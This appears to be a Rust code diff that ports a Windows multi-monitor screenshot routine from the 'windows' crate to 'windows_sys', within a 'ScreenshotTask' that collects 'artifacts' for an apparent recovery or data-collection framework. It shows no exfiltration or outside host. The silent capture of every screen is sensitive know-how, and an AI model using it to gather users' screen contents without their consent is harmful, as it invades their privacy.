@@ -52,7 +52,7 @@ impl RecoveryTask for ScreenshotTask {
             artifacts.push(artifact);
         }
 
-        Ok(artifacts)
+        Ok(artifacts.into_iter().flatten().collect())
     }
 }
 
@@ -64,44 +64,44 @@ pub struct MonitorCapture {
 #[cfg(windows)]
 #[derive(Clone)]
 struct MonitorInfo {
-    rect: windows::Win32::Foundation::RECT,
+    rect: windows_sys::Win32::Foundation::RECT,
     device_name: String,
 }
 
 #[cfg(windows)]
 pub fn capture_all_screens() -> Vec<MonitorCapture> {
     use std::mem::{size_of, zeroed};
-    use windows::Win32::Foundation::{BOOL, LPARAM, RECT};
-    use windows::Win32::Graphics::Gdi::{
-        EnumDisplayMonitors, GetMonitorInfoW, HDC, MONITORINFOEXW,
+    use windows_sys::Win32::Foundation::{LPARAM, RECT};
+    use windows_sys::Win32::Graphics::Gdi::{
+        EnumDisplayMonitors, GetMonitorInfoW, HDC, HMONITOR, MONITORINFOEXW,
     };
 
     unsafe extern "system" fn enum_monitor(
-        monitor: windows::Win32::Graphics::Gdi::HMONITOR,
+        monitor: HMONITOR,
         _hdc: HDC,
         _rect: *mut RECT,
         lparam: LPARAM,
-    ) -> BOOL {
-        let monitors = unsafe { &mut *(lparam.0 as *mut Vec<MonitorInfo>) };
+    ) -> i32 {
+        let monitors = unsafe { &mut *(lparam as *mut Vec<MonitorInfo>) };
         let mut info: MONITORINFOEXW = unsafe { zeroed() };
         info.monitorInfo.cbSize = size_of::<MONITORINFOEXW>() as u32;
-        if unsafe { GetMonitorInfoW(monitor, &mut info as *mut _ as *mut _) }.as_bool() {
+        if unsafe { GetMonitorInfoW(monitor, &mut info as *mut _ as *mut _) } != 0 {
             let name = utf16_to_string(&info.szDevice);
             monitors.push(MonitorInfo {
                 rect: info.monitorInfo.rcMonitor,
                 device_name: name,
             });
         }
-        BOOL(1)
+        1 // CONTINUE
     }
 
     let mut monitors: Vec<MonitorInfo> = Vec::new();
     unsafe {
         EnumDisplayMonitors(
-            HDC(0),
-            None,
+            std::ptr::null_mut(),
+            std::ptr::null(),
             Some(enum_monitor),
-            LPARAM(&mut monitors as *mut _ as isize),
+            &mut monitors as *mut _ as isize,
         );
     }
 
@@ -143,11 +143,11 @@ fn capture_all_screens() -> Vec<MonitorCapture> {
 #[cfg(windows)]
 fn capture_monitor(index: usize, monitor: &MonitorInfo) -> Result<MonitorCapture, String> {
     use std::mem::size_of;
-    use windows::Win32::Foundation::{HWND, RECT};
-    use windows::Win32::Graphics::Gdi::{
+    use windows_sys::Win32::Foundation::RECT;
+    use windows_sys::Win32::Graphics::Gdi::{
         BI_RGB, BITMAPINFO, BITMAPINFOHEADER, CAPTUREBLT, CreateCompatibleBitmap,
-        CreateCompatibleDC, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDC, GetDIBits, HGDIOBJ,
-        RGBQUAD, ReleaseDC, SRCCOPY, SelectObject,
+        CreateCompatibleDC, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDC, GetDIBits, ReleaseDC,
+        SRCCOPY, SelectObject,
     };
 
     let RECT {
@@ -163,24 +163,24 @@ fn capture_monitor(index: usize, monitor: &MonitorInfo) -> Result<MonitorCapture
     }
 
     unsafe {
-        let screen_dc = GetDC(HWND(0));
-        if screen_dc.0 == 0 {
+        let screen_dc = GetDC(std::ptr::null_mut());
+        if screen_dc.is_null() {
             return Err("failed to acquire screen dc".to_string());
         }
         let mem_dc = CreateCompatibleDC(screen_dc);
-        if mem_dc.0 == 0 {
-            ReleaseDC(HWND(0), screen_dc);
+        if mem_dc.is_null() {
+            ReleaseDC(std::ptr::null_mut(), screen_dc);
             return Err("failed to create compatible dc".to_string());
         }
         let bitmap = CreateCompatibleBitmap(screen_dc, width, height);
-        if bitmap.0 == 0 {
+        if bitmap.is_null() {
             DeleteDC(mem_dc);
-            ReleaseDC(HWND(0), screen_dc);
+            ReleaseDC(std::ptr::null_mut(), screen_dc);
             return Err("failed to create compatible bitmap".to_string());
         }
 
-        let old = SelectObject(mem_dc, HGDIOBJ(bitmap.0));
-        let blt_ok = windows::Win32::Graphics::Gdi::BitBlt(
+        let old = SelectObject(mem_dc, bitmap);
+        let blt_ok = windows_sys::Win32::Graphics::Gdi::BitBlt(
             mem_dc,
             0,
             0,
@@ -191,12 +191,12 @@ fn capture_monitor(index: usize, monitor: &MonitorInfo) -> Result<MonitorCapture
             top,
             SRCCOPY | CAPTUREBLT,
         );
-        if let Err(err) = blt_ok {
+        if blt_ok == 0 {
             SelectObject(mem_dc, old);
-            DeleteObject(HGDIOBJ(bitmap.0));
+            DeleteObject(bitmap);
             DeleteDC(mem_dc);
-            ReleaseDC(HWND(0), screen_dc);
-            return Err(format!("BitBlt failed: {err}"));
+            ReleaseDC(std::ptr::null_mut(), screen_dc);
+            return Err("BitBlt failed".to_string());
         }
 
         let mut bmi = BITMAPINFO {
@@ -206,14 +206,14 @@ fn capture_monitor(index: usize, monitor: &MonitorInfo) -> Result<MonitorCapture
                 biHeight: -height,
                 biPlanes: 1,
                 biBitCount: 32,
-                biCompression: BI_RGB.0,
+                biCompression: BI_RGB as u32,
                 biSizeImage: 0,
                 biXPelsPerMeter: 0,
                 biYPelsPerMeter: 0,
                 biClrUsed: 0,
                 biClrImportant: 0,
             },
-            bmiColors: [RGBQUAD::default(); 1],
+            bmiColors: [std::mem::zeroed(); 1],
         };
 
         let buffer_len = (width * height * 4) as usize;
@@ -223,15 +223,15 @@ fn capture_monitor(index: usize, monitor: &MonitorInfo) -> Result<MonitorCapture
             bitmap,
             0,
             height as u32,
-            Some(bgra.as_mut_ptr() as *mut _),
+            bgra.as_mut_ptr() as *mut _,
             &mut bmi,
             DIB_RGB_COLORS,
         );
 
         SelectObject(mem_dc, old);
-        DeleteObject(HGDIOBJ(bitmap.0));
+        DeleteObject(bitmap);
         DeleteDC(mem_dc);
-        ReleaseDC(HWND(0), screen_dc);
+        ReleaseDC(std::ptr::null_mut(), screen_dc);
 
         if scanlines == 0 {
             return Err("GetDIBits failed".to_string());
